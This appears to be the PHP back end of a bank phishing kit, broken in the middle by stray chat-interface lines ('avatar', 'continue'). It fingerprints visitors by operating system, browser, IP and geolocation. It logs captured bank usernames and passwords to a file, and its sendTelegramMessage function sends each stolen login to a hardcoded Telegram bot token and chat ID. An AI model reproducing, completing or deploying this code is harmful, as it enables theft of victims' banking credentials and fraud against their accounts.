<?php
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(get
avatar
continue

avatar
env('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';


return $ipaddress;

}

function getIPDetails($ip)
{
    $url      = "https://ipapi.co/$ip/json/";
    $details  = file_get_contents($url);
    $details  = json_decode($details, true);

    return $details;
}

function logCombo($file, $bank, $ip, $user, $pass)
{
    $data = "$bank -> IP: $ip | USERNAME: $user | PASSWORD: $pass\n";
    file_put_contents($file, $data, FILE_APPEND);
}

function logData($file, $bank, $ip, $os, $version, $browser, $country = '', $city = '', $continent = '', $type = '', $cn = '', $isp = '', $la = '', $lp = '', $crn = '')
{
    $data = "$bank -> IP: $ip | OS: $os | $version | BROWSER: $browser";
    
    if ($country !== '') {
        $data .= " | COUNTRY: $country";
    }
    if ($city !== '') {
        $data .= " | CITY: $city";
    }
    if ($continent !== '') {
        $data .= " | CONTINENT: $continent";
    }
    if ($type !== '') {
        $data .= " | TYPE: $type";
    }
    if ($cn !== '') {
        $data .= " | COUNTRY PHONE CODE: $cn";
    }
    if ($isp !== '') {
        $data .= " | ISP: $isp";
    }
    if ($la !== '' && $lp !== '') {
        $data .= " | LOCATION: $la,$lp";
    }
    if ($crn !== '') {
        $data .= " | CURRENCY: $crn";
    }
    $data .= "\n";
    file_put_contents($file, $data, FILE_APPEND);
}

function sendTelegramMessage($user, $pass, $ip, $bank)
{
    // Replace with your Telegram bot token and chat ID
    $telegram_token = '5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA';
    $telegram_chat_id = '-821080105';

    $message = "New login details:\n\nBank: $bank\nIP: $ip\nUsername: $user\nPassword: $pass";

    $url = "https://api.telegram.org/bot$telegram_token/sendMessage?parse_mode=html&chat_id=$telegram_chat_id&text=" . urlencode($message);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_exec($ch);
    curl_close($ch);
}

?>